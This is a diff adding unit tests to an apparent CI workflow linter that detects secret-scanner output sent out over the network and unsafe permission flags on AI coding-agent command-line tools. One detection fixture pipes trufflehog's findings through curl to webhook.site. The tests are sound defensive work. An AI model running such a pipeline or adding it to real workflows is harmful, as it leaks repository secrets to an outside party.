@@ -142,6 +142,72 @@ class TestGHA057SecretScannerExfil:
         f = run_check(wf, "GHA-057")
         assert f.passed
 
+    def test_fails_on_pipeline_split_by_backslash_continuation(self):
+        # The exact exploit-example shape: trufflehog and curl on
+        # separate YAML lines joined by a trailing ``\``. The detector
+        # must fold the continuation before splitting on ``|``.
+        wf = """
+        name: ci
+        on: push
+        jobs:
+          harvest:
+            runs-on: ubuntu-latest
+            steps:
+              - run: |
+                  trufflehog filesystem . --json \\
+                    | curl -X POST --data-binary @- \\
+                        https://webhook.site/abc
+        """
+        f = run_check(wf, "GHA-057")
+        assert not f.passed
+        assert "piped to network egress" in f.description.lower()
+
+    def test_passes_when_step_if_restricts_to_push(self):
+        # Workflow declares pull_request_target alongside push, but the
+        # scanner step is gated on github.event_name == 'push', so the
+        # untrusted path is unreachable.
+        wf = """
+        name: ci
+        on: [push, pull_request_target]
+        jobs:
+          scan:
+            runs-on: ubuntu-latest
+            steps:
+              - if: github.event_name == 'push'
+                run: trufflehog filesystem . --json > findings.sarif
+        """
+        f = run_check(wf, "GHA-057")
+        assert f.passed
+
+    def test_passes_when_job_if_restricts_to_push(self):
+        wf = """
+        name: ci
+        on: [push, pull_request_target]
+        jobs:
+          scan:
+            if: ${{ github.event_name == 'push' }}
+            runs-on: ubuntu-latest
+            steps:
+              - run: trufflehog filesystem . --json > findings.sarif
+        """
+        f = run_check(wf, "GHA-057")
+        assert f.passed
+
+    def test_fails_when_if_predicate_mentions_untrusted_trigger(self):
+        # A predicate that *includes* an untrusted trigger doesn't restrict.
+        wf = """
+        name: ci
+        on: [push, pull_request_target]
+        jobs:
+          scan:
+            runs-on: ubuntu-latest
+            steps:
+              - if: ${{ github.event_name == 'push' || github.event_name == 'pull_request_target' }}
+                run: trufflehog filesystem . --json
+        """
+        f = run_check(wf, "GHA-057")
+        assert not f.passed
+
 
 # ── GHA-058 agentic CLI permission-bypass flags ──────────────────────
 
@@ -224,6 +290,26 @@ class TestGHA058AICLIUnsafeFlags:
             runs-on: ubuntu-latest
             steps:
               - run: claude --allowedTools "Read,Grep" -p "summarize"
+        """
+        f = run_check(wf, "GHA-058")
+        assert f.passed
+
+    def test_passes_on_tool_name_containing_substring_all(self):
+        # Regression: the old regex matched the literal substring "all"
+        # anywhere in the value, so CallTool / rally / "Read,Grep,All"
+        # tripped a false positive. The anchored alternation must reject
+        # these.
+        wf = """
+        name: ci
+        on: push
+        jobs:
+          agentic:
+            runs-on: ubuntu-latest
+            steps:
+              - run: |
+                  claude --allowedTools CallTool -p "x"
+                  claude --allowedTools rally -p "y"
+                  claude --allowedTools "Read,Grep,All" -p "z"
         """
         f = run_check(wf, "GHA-058")
         assert f.passed
